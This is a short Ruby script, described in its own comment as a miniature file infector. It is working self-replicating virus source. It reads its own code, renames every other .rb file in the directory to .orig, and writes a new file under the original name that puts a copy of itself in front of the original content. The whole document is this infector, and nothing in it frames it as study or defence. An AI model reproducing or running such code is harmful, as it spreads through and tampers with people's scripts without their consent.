# Miniature Ruby file infector: walks neighboring scripts, stashes each
# original under a rewritten extension, then prepends a payload copy.
payload = File.read(__FILE__)

Dir['*.rb'].each do |file|
  next if file == __FILE__
  original = File.read(file)
  File.rename(file, file.gsub('.rb', '.orig'))
  File.open(file, 'w') { |fh| fh.write(payload + "\n" + original) }
end
